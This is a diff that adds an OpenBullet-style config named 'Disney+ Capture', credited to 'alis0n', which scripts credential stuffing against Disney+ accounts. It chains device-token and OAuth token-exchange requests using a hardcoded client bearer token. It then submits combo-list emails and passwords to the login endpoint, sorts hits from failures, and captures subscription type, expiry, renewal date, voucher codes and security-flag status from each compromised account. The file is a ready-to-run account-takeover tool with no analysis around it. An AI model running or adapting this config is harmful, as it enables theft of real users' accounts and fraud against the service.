@@ -1,0 +1,217 @@
+[SETTINGS]
+{
+  "Name": "Disney+ Capture",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2021-02-28T22:52:02.6889245-04:00",
+  "AdditionalInfo": "",
+  "Author": "alis0n",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Tok1 REQUEST POST "https://global.edge.bamgrid.com/devices" 
+  CONTENT "{\"deviceFamily\":\"application\",\"applicationRuntime\":\"iPhone7,2\",\"deviceProfile\":\"iPhone7,2\",\"attributes\":{}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: global.edge.bamgrid.com" 
+  HEADER "X-BAMSDK-Platform: iPhone7,2" 
+  HEADER "Accept: application/json" 
+  HEADER "X-BAMSDK-Client-ID: disney-svod-3d9324fc" 
+  HEADER "Authorization: Bearer ZGlzbmV5JmFwcGxlJjEuMC4w.H9L7eJvc2oPYwDgmkoar6HzhBJRuUUzt_PcaC3utBI4" 
+  HEADER "X-BAMSDK-Transaction-ID: 38352459-B3B6-4B40-BEA5-DF106B4A4020" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "X-BAMSDK-Version: 9.9.2" 
+  HEADER "X-DSS-Edge-Accept: vnd.dss.edge+json; version=1" 
+  HEADER "Content-Length: 1019" 
+  HEADER "User-Agent: Disney+/23962 CFNetwork/978.0.7 Darwin/18.7.0" 
+  HEADER "Connection: close" 
+
+#BadLoc KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" Contains "403" 
+
+#Tok1 PARSE "<SOURCE>" JSON "assertion" -> VAR "Tok1" 
+
+#Tok2 REQUEST POST "https://global.edge.bamgrid.com/token " EncodeContent=TRUE 
+  CONTENT "platform=iphone&grant_type=urn:ietf:params:oauth:grant-type:token-exchange&subject_token=<Tok1>&subject_token_type=urn:bamtech:params:oauth:token-type:device" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Disney+/23962 CFNetwork/978.0.7 Darwin/18.7.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Host: global.edge.bamgrid.com" 
+  HEADER "X-BAMSDK-Platform: iPhone7,2" 
+  HEADER "X-BAMSDK-Client-ID: disney-svod-3d9324fc" 
+  HEADER "Authorization: Bearer ZGlzbmV5JmFwcGxlJjEuMC4w.H9L7eJvc2oPYwDgmkoar6HzhBJRuUUzt_PcaC3utBI4" 
+  HEADER "X-BAMSDK-Transaction-ID: 38352459-B3B6-4B40-BEA5-DF106B4A4020" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "X-BAMSDK-Version: 9.9.2" 
+  HEADER "X-DSS-Edge-Accept: vnd.dss.edge+json; version=1" 
+  HEADER "Content-Length: 1019" 
+  HEADER "Connection: close" 
+
+#Tok2 PARSE "<SOURCE>" JSON "access_token" -> VAR "Tok2" 
+
+#BadLoc2 KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "unauthorized_client" 
+    KEY "invalid-token" 
+
+#Login REQUEST POST "https://global.edge.bamgrid.com/idp/login" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: global.edge.bamgrid.com" 
+  HEADER "X-BAMSDK-Platform: iPhone7,2" 
+  HEADER "Accept: application/json; charset=utf-8" 
+  HEADER "X-BAMSDK-Client-ID: disney-svod-3d9324fc" 
+  HEADER "Authorization: Bearer <Tok2>" 
+  HEADER "X-BAMSDK-Transaction-ID: B60EB6F9-C59D-4037-827A-6D1E9B707F69" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Accept-Encoding: br, gzip, deflate" 
+  HEADER "X-BAMSDK-Version: 9.9.2" 
+  HEADER "X-DSS-Edge-Accept: vnd.dss.edge+json; version=1" 
+  HEADER "Content-Length: 67" 
+  HEADER "User-Agent: Disney+/23962 CFNetwork/978.0.7 Darwin/18.7.0" 
+  HEADER "Connection: keep-alive" 
+
+#Key_Login KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "id_token" 
+  KEYCHAIN Failure OR 
+    KEY "Bad credentials sent for" 
+    KEY "is not a valid email Address at /email" 
+  KEYCHAIN Retry OR 
+    KEY "{\"errors\":[{\"code\":\"forbidden\"}]}" 
+    KEY "access-token.invalid" 
+
+#LogTok PARSE "<SOURCE>" JSON "id_token" -> VAR "LogTok" 
+
+#Tok3 REQUEST POST "https://global.edge.bamgrid.com/accounts/grant" 
+  CONTENT "{\"id_token\":\"<LogTok>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: global.edge.bamgrid.com" 
+  HEADER "X-BAMSDK-Platform: iPhone7,2" 
+  HEADER "Accept: application/json; charset=utf-8" 
+  HEADER "X-BAMSDK-Client-ID: disney-svod-3d9324fc" 
+  HEADER "Authorization: Bearer <Tok2>" 
+  HEADER "X-BAMSDK-Transaction-ID: B60EB6F9-C59D-4037-827A-6D1E9B707F69" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Accept-Encoding: br, gzip, deflate" 
+  HEADER "X-BAMSDK-Version: 9.9.2" 
+  HEADER "X-DSS-Edge-Accept: vnd.dss.edge+json; version=1" 
+  HEADER "Content-Length: 67" 
+  HEADER "User-Agent: Disney+/23962 CFNetwork/978.0.7 Darwin/18.7.0" 
+  HEADER "Connection: keep-alive" 
+
+#Tok3 PARSE "<SOURCE>" JSON "assertion" -> VAR "Tok3" 
+
+#Tok4 REQUEST POST "https://global.edge.bamgrid.com/token " EncodeContent=TRUE 
+  CONTENT "grant_type=urn:ietf:params:oauth:grant-type:token-exchange&latitude=0&longitude=0&platform=browser&subject_token=<Tok3>&subject_token_type=urn:bamtech:params:oauth:token-type:account" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: global.edge.bamgrid.com" 
+  HEADER "X-BAMSDK-Platform: iPhone7,2" 
+  HEADER "Accept: application/json" 
+  HEADER "X-BAMSDK-Client-ID: disney-svod-3d9324fc" 
+  HEADER "Authorization: Bearer ZGlzbmV5JmFwcGxlJjEuMC4w.H9L7eJvc2oPYwDgmkoar6HzhBJRuUUzt_PcaC3utBI4" 
+  HEADER "X-BAMSDK-Transaction-ID: 38352459-B3B6-4B40-BEA5-DF106B4A4020" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "X-BAMSDK-Version: 9.9.2" 
+  HEADER "X-DSS-Edge-Accept: vnd.dss.edge+json; version=1" 
+  HEADER "Content-Length: 1019" 
+  HEADER "User-Agent: Disney+/23962 CFNetwork/978.0.7 Darwin/18.7.0" 
+  HEADER "Connection: close" 
+
+#Tok4 PARSE "<SOURCE>" JSON "access_token" -> VAR "Tok4" 
+
+#Uname REQUEST GET "https://global.edge.bamgrid.com/accounts/me" 
+  
+  HEADER "User-Agent: Disney+/23962 CFNetwork/978.0.7 Darwin/18.7.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "X-BAMSDK-Platform: iPhone7,2" 
+  HEADER "X-BAMSDK-Client-ID: disney-svod-3d9324fc" 
+  HEADER "authorization: Bearer <Tok4>" 
+  HEADER "X-BAMSDK-Version: 9.9.2" 
+
+#Email_Verified PARSE "<SOURCE>" JSON "emailVerified" CreateEmpty=FALSE -> CAP "Email Verified" 
+
+#Security_Flagged PARSE "<SOURCE>" JSON "securityFlagged" CreateEmpty=FALSE -> CAP "Security Flagged" 
+
+#country PARSE "<SOURCE>" JSON "country" CreateEmpty=FALSE -> CAP "country" 
+
+#SUBSCRIPTIONS REQUEST GET "https://global.edge.bamgrid.com/subscriptions" 
+  
+  HEADER "User-Agent: Disney+/23962 CFNetwork/978.0.7 Darwin/18.7.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "X-BAMSDK-Platform: iPhone7,2" 
+  HEADER "X-BAMSDK-Client-ID: disney-svod-3d9324fc" 
+  HEADER "authorization: Bearer <Tok4>" 
+  HEADER "X-BAMSDK-Version: 9.9.2" 
+
+#Subscription PARSE "<SOURCE>" LR "\"name\":\"" "\"" Recursive=TRUE -> CAP "Subscription" 
+
+#Sub_Type PARSE "<SOURCE>" JSON "subType" -> CAP "Sub Type" 
+
+#Description PARSE "<SOURCE>" JSON "desc" -> CAP "Description" 
+
+#Expire_Date PARSE "<SOURCE>" JSON "expirationDate" -> CAP "Expire Date" 
+
+#Next_Renewal_Date PARSE "<SOURCE>" JSON "nextRenewalDate" -> CAP "Next Renewal Date" 
+
+#Trial PARSE "<SOURCE>" LR "freeTrial\":{\"status\":\"" "\"}," -> CAP "Free Trial" 
+
+#Last_Connection PARSE "<SOURCE>" JSON "lastSyncDate" -> CAP "Last Connection" 
+
+#Voucher_Code PARSE "<SOURCE>" JSON "voucherCode" -> CAP "Voucher Code" 
+
+#Early_Access PARSE "<SOURCE>" JSON "earlyAccess" -> CAP "Early Access" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "[]" 
+
+#CREDIT FUNCTION Constant "alis0n" -> VAR "Config By" 
+
